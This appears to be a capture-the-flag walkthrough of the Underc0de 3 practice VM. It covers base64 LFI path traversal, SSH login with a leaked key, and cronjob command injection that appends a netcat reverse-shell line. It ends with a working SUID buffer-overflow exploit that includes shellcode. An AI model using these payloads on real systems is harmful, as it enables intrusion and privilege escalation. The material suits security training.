---
title: "Underc0de 3 Boot2Root Walkthrough: LFI, Python Cron Command Injection, and SUID Binary Exploitation"
date: 2014-12-03T10:37:59+00:00
url: "/underc0de-3-walkthrough/"
draft: false
description: "A comprehensive Boot2Root walkthrough of the Underc0de 3 challenge: base64 Local File Inclusion (LFI), SSH key discovery, command injection in a Python cronjob, and SUID stack buffer overflow."
categories: ["CTF", "Security", "exploit-dev", "Web Security"]
tags: ["ctf", "boot2root", "lfi", "cron-injection", "buffer-overflow", "gdb", "privilege-escalation"]
image: "/uploads/2014/12/Screen-Shot-2014-12-03-at-7.07.00-AM.png"
---

**Underc0de 3** is a vulnerable Boot2Root virtual machine designed for penetration testing practice. The attack chain spans web reconnaissance, encoded Local File Inclusion (LFI), credential discovery, cronjob command injection, and final privilege escalation via an SUID buffer overflow.

---

### Phase 1: Network Reconnaissance and Port Scanning

Identify the target VM using `netdiscover` or `arp-scan`:
- Target IP: `192.168.1.112`

Run a full Nmap service scan:

```bash
nmap -sS -sV -p- -T4 192.168.1.112
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.2.22 (Debian)
```

---

### Phase 2: Web Reconnaissance & Base64-Encoded LFI

Directory enumeration using `dirb` reveals an `/ascii/` folder and `/index.html`. Inspecting the HTML source reveals a hidden comment:

```html
<!--<a href="v.php?a=YXNjaWkxLnR4dA==">foo</a>-->
```

Decoding the Base64 value:
```python
>>> import base64
>>> base64.b64decode("YXNjaWkxLnR4dA==")
b'ascii1.txt'
```

The script `v.php` accepts a Base64-encoded file path and includes it. Testing directory traversal with `../../../../etc/passwd`:

```python
>>> base64.b64encode(b"../../../../etc/passwd")
b'Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=='
```

Requesting `http://192.168.1.112/v.php?a=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==` successfully discloses `/etc/passwd`, confirming an unauthenticated **Local File Inclusion (LFI)** vulnerability. Users with interactive login shells: `root`, `underdist`, and `cuervo`.

---

### Phase 3: SSH Key Discovery & Initial Foothold

Fuzzing internal files through LFI reveals a backup archive at `http://192.168.1.112/b_gd214dg/foo.backup`, containing an unencrypted OpenSSH private key.

Testing the key against the discovered usernames:

```bash
chmod 600 foo.backup
ssh -i foo.backup cuervo@192.168.1.112
```
Login succeeds as user `cuervo`.

---

### Phase 4: Lateral Movement via Python Cron Command Injection

Auditing user directories reveals an automated monitoring script owned by user `underdist`:
`/home/underdist/cronping.py`

```python
# /home/underdist/cronping.py
import os

def ips():
    return open("ips.txt")

def command(c):
    p = os.popen('ping -c 1 -w 1 %s | grep received | cut -d " " -f 4' % (c), "r")
    return p.read()

def verify():
    for ip in ips():
        ip = ip.replace("\n", "")
        if command(ip) == "1\n":
            ...
verify()
```

#### The Flaw:
The script executes every minute via cron under user `underdist`. It reads `/home/underdist/ips.txt`—**which is world-writable (`0777`)**—and concatenates each line into an unsanitized `os.popen` shell command.

#### Exploitation:
Append a command separator with a reverse shell command into `ips.txt`:

```bash
echo "127.0.0.1; nc -e /bin/sh 192.168.1.100 1337" >> /home/underdist/ips.txt
```

Catch the incoming reverse connection with Netcat:

```bash
nc -lvnp 1337
# Connection received!
whoami
# underdist
```

We now have code execution as user `underdist`.

---

### Phase 5: Root Privilege Escalation via SUID Stack Overflow

Inspecting `/home/underdist/.bin` reveals an SUID executable owned by root: `echo`.

Running `checksec`:
```text
RELRO           STACK CANARY      NX            PIE             FILE
No RELRO        No canary found   NX disabled   No PIE          echo
```
The binary has **NX disabled** (executable stack) and **no stack canaries**.

#### Disassembly Analysis:
Disassembling `main` in GDB:
```x86asm
0x08048461 <+21>:    lea    -0x12c(%ebp),%eax
0x08048467 <+27>:    mov    %eax,(%esp)
0x0804846a <+30>:    call   <strcpy@plt>
```
`strcpy` copies `argv[1]` into a 300-byte stack buffer without bounds validation.

#### Stack Overflow Offset & Shellcode:
- Distance to return address: 304 bytes.
- Standard 23-byte Linux x86 `execve("/bin/sh")` shellcode:
  `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`
- NOP sled: 281 bytes (`\x90`).
- Target stack return address: `0xbffff8bd`.

#### Executing Root Exploit:
```bash
./echo $(python -c "print '\x90'*281 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\xbd\xf8\xff\xbf'")
# whoami
root
```

We obtain the root shell and finish the challenge.
